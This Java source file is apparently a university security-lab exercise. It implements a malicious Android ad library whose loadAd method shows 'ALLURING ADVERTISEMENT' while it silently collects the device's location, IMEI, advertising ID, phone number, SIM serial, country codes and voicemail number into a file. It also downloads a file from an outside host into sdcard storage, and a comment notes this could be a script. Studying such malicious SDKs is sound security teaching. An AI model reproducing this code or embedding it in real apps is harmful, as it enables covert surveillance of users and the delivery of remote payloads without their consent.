package uk.ac.imperial.seclab.android.co447.mp1.myadlibrary;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Contacts;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.widget.TextView;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.telephony.TelephonyManager;
import android.provider.ContactsContract;
//import com.google.android.gms.location.LocationListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

// Imports for the file downloading function
import android.app.DownloadManager;
import android.net.Uri;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.concurrent.TimeUnit;




import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.support.annotation.NonNull;
import android.util.Log;

import static android.content.ContentValues.TAG;

public class MyAdView {
    private static final String TAG = "MP1: MyAdView";
    public static Context ctx;
    public static boolean isLAT = false;
    public static String LOCA;
    public static String IMEI;
    public static String ADID;
    public static void loadAd(TextView tv, Context ctx) {
        MyAdView.ctx = ctx;

        tv.setText("ALLURING ADVERTISEMENT");
        onLoad();

    }

    public interface AsyncResponse {
        void processFinish(String output);
    }
    private static void onLoad() {
        //TODO: Implement me

        //String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
        //Long tsLong = System.currentTimeMillis()/1000;
        //String ts = tsLong.toString();

        // ------------------------------------ Part 1 : A---------------------------
        // GET LOCATION
        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        Location location;
        LocationManager locationManager;
        locationManager = (LocationManager) ctx.getSystemService(ctx.LOCATION_SERVICE);
        location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (location != null) {
            Log.d("Answers", "Lat: " + location.getLatitude() + "Long: " + location.getLongitude());
            String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
            LOCA = timeStamp + ";" + "longitude:" + location.getLongitude() + "latitude:" + location.getLatitude();
        }else{
            LocationListener loc_listener = new LocationListener() {
                public void onLocationChanged(Location l) {}
                public void onProviderEnabled(String p) {}
                public void onProviderDisabled(String p) {}
                public void onStatusChanged(String p, int status, Bundle extras) {}
            };
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, loc_listener);
            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            try {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                Log.d("Answers", "Lat: " + lat + "Long: " + lon);
                String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
                LOCA = timeStamp + ";" + "longitude:" + location.getLongitude() + "latitude:" + location.getLatitude();
            } catch (NullPointerException e) {Log.d("Answers", "Lat: N" + "Long: N" );}
        }
        writeToFile(LOCA);


        // GET IMEI
        TelephonyManager telephonyManager = (TelephonyManager)ctx.getSystemService(ctx.TELEPHONY_SERVICE);
        String id = telephonyManager.getDeviceId();
        Log.d("Answers", "IMEI: " + id);
        String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
        IMEI = timeStamp + ";" + "IMEI:" + id;
        writeToFile(IMEI);



        //GET ADVERTISING ID
        AsyncTask<Void, Void, String> task = new AsyncTask<Void, Void, String>() {
            public AsyncResponse delegate = null;

            @Override
            protected String doInBackground(Void... params) {
                AdvertisingIdClient.Info idInfo = null;
                try {
                    idInfo = AdvertisingIdClient.getAdvertisingIdInfo(ctx.getApplicationContext());
                } catch (GooglePlayServicesNotAvailableException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesRepairableException e) {
                    e.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                String advertId = null;
                try{
                    advertId = idInfo.getId();
                    String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
                    ADID = timeStamp + ";" + "advertising_id:" + advertId;
                    String input = LOCA + "\n" + IMEI + "\n" + ADID;
                    writeToFile(input);
                }catch (Exception e){
                    e.printStackTrace();
                }

                return advertId;
            }

            @Override
            protected void onPostExecute(String advertId) {
                Log.d("Answers", "advertId: " + advertId);
                //delegate.processFinish(advertId);
            }


        };
        task.execute();



        ////////// READ CONTACTS
        //Uri personUri = ContentUris.withAppendedId(People.CONTENT_URI, personId);
        //Uri phonesUri = Uri.withAppendedPath(personUri, People.Phones.CONTENT_DIRECTORY);
        //String[] proj = new String[] {Phones._ID, Contacts.People.Phones.TYPE, Contacts.People.Phones.NUMBER, Contacts.People.Phones.LABEL};
        //Cursor cursor = contentResolver.query(phonesUri, proj, null, null, null);


        ////////// DOWNLOAD SCRIPT FROM A WEBSITE
        // I this example case it is just a picture, but it could be something else

        DownloadManager downloadmanager = (DownloadManager) ctx.getSystemService(ctx.DOWNLOAD_SERVICE);
        Uri uri = Uri.parse("http://classe-confidentiel.com/boyd/4.png");

        DownloadManager.Request request = new DownloadManager.Request(uri);
        request.setTitle("My File");
        request.setDescription("Downloading");
        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
        request.setVisibleInDownloadsUi(false);
        request.setDestinationUri(Uri.parse("file:///mnt/sdcard/myPicture.png"));

        downloadmanager.enqueue(request);



        // ------------------------------------ Part 1 : B---------------------------
        // GET PHONE NUMBER
        String phoneNumber = telephonyManager.getLine1Number();
        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
        writeToFile(timeStamp + ";" + "Phone Number:" + phoneNumber);

        // GET SIM SERIAL NUMBER
        String sim = telephonyManager.getSimSerialNumber();
        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
        writeToFile(timeStamp + ";" + "SIM:" + sim);

        // GET NETWORK COUNTRY
        String networkCountryISO=telephonyManager.getNetworkCountryIso();
        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
        writeToFile(timeStamp + ";" + "Network Country:" + networkCountryISO);

        // GET SIM COUNTRY
        String SIMCountryISO=telephonyManager.getSimCountryIso();
        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
        writeToFile(timeStamp + ";" + "SIM Country:" + SIMCountryISO);

        // GET VOICE MAIL NUMBER
        String voiceMailNumber=telephonyManager.getVoiceMailNumber();
        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
        writeToFile(timeStamp + ";" + "Voice Mail Number:" + voiceMailNumber);
    }



    private static void writeToFile(String data1){
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(ctx.openFileOutput("Part1_malad.txt", ctx.MODE_PRIVATE));
            outputStreamWriter.write(data1);
            outputStreamWriter.close();
        }
        catch (IOException e) {
            Log.e("Exception", "File write failed: " + e.toString());
        }

    }


}




